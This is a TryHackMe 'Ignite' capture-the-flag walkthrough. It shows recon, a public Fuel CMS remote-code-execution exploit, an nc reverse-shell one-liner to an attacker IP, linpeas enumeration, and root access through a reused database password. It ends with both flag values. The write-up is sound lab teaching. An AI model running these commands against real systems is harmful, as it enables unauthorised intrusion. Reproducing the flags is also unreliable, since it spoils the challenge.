[THM](https://tryhackme.com/room/ignite)

Finding the IP
```
sudo arp-scan -l
```

Nmap scan:
```
nmap -sV -O -T4 --min-rate=10000 $ip
```
output
```zsh
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 08:00:27:9F:EC:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
```

Gobuster:
```
gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/common.txt -t 300 -x txt,php,html -q
```
output
```zsh
/.hta.php             (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 297]
/@                    (Status: 400) [Size: 1134]
/@.html               (Status: 400) [Size: 1134]
/@.txt                (Status: 400) [Size: 1134]
/.hta.txt             (Status: 403) [Size: 296]
/0                    (Status: 200) [Size: 16597]
/.hta.html            (Status: 403) [Size: 297]
/assets               (Status: 301) [Size: 315] 
/.htpasswd.txt        (Status: 403) [Size: 301]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd.html       (Status: 403) [Size: 302]
/.htaccess.txt        (Status: 403) [Size: 301]
/.hta                 (Status: 403) [Size: 292]
/.htaccess.php        (Status: 403) [Size: 301]
/.htpasswd.php        (Status: 403) [Size: 301]
/@.php                (Status: 400) [Size: 1134]
/home                 (Status: 200) [Size: 16597]
/index.php            (Status: 200) [Size: 16597]
/index                (Status: 200) [Size: 16597]
/index.php            (Status: 200) [Size: 16597]
/.htaccess.html       (Status: 403) [Size: 302]
/lost+found           (Status: 400) [Size: 1134]
/lost+found.html      (Status: 400) [Size: 1134]
/lost+found.php       (Status: 400) [Size: 1134]
/lost+found.txt       (Status: 400) [Size: 1134]
/offline              (Status: 200) [Size: 70]
/robots.txt           (Status: 200) [Size: 30]
/robots.txt           (Status: 200) [Size: 30]
/server-status        (Status: 403) [Size: 301]
```
From the results
- Normal 200 OK responses on `/index.php`, `/home`, `/offline`, `/robots.txt`.
- `/assets` redirects (301) to a directory.

Saw a login page at `fuel/login`
Logged in using 
admin
admin
Didn't find anything useful

Used Searchsploit for Fuel CMS
```
searchsploit fuel 1.4
```
output
```zsh
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                                                                        | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                                                                        | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                                                                                        | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                                                                                                                       | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                                                                              | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                                                                                  | php/webapps/48778.txt
```

Download the exploit `Fuel CMS 1.4.1 - Remote Code Execution (3)`
```
searchsploit -m "php/webapps/50477.py"
```
output
```zsh
  Exploit: Fuel CMS 1.4.1 - Remote Code Execution (3)
      URL: https://www.exploit-db.com/exploits/50477
     Path: /usr/share/exploitdb/exploits/php/webapps/50477.py
    Codes: CVE-2018-16763
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/aswil/Trash/50477.py
```

Run the exploit
```
python3 50477.py -u http://$ip
```
output
```zsh
[+]Connecting...
Enter Command $
```

```
uname -a
cat /etc/os-release
```
output
```shell
systemLinux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

systemNAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

Check nc
```
Enter Command $which nc
```
output
```shell
system/bin/nc
```

Attempt for a reverse shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.170.71.2 1337 >/tmp/f
```
Listener
```
nc -lnvp 1337
```
Got the reverse shell

To get a more stable shell and moved to `/tmp`
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
cd /tmp
```

Hosted a Python server
Downloaded `linpeas.sh`
Run linpeas.sh
```
chmod +x linpeas.sh
./linpeas.sh
```
output
```bash
╔══════════╣ Analyzing Backup Manager Files (limit 70)

-rwxrwxrwx 1 root root 4646 Jul 26  2019 /var/www/html/fuel/application/config/database.php
|	['password'] The password used to connect to the database
|	['database'] The name of the database you want to connect to
	'password' => 'mememe',
	'database' => 'fuel_schema',
```

Read the file `/var/www/html/fuel/application/config/database.php`
```
cat /var/www/html/fuel/application/config/database.php
```
output
```bash
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
```
Got the password as `mememe`

Switch user
```
www-data@ubuntu:/tmp$ sudo su
sudo su
[sudo] password for www-data: mememe

Sorry, try again.
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# 
```
Access Granted ROOT

Read the flag
```
root@ubuntu:/var/www/html/fuel/application/config# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d 
root@ubuntu:~# cd /home
cd /home
root@ubuntu:/home# ls
ls
www-data
root@ubuntu:/home# cd ww	
cd www-data/
root@ubuntu:/home/www-data# ls
ls
flag.txt
root@ubuntu:/home/www-data# cat flag.txt
cat flag.txt
6470e394cbf6dab6a91682cc8585059b 
```

User flag: `6470e394cbf6dab6a91682cc8585059b`
Root flag: `b9bbcb33e11b80be759c4e844862482d`
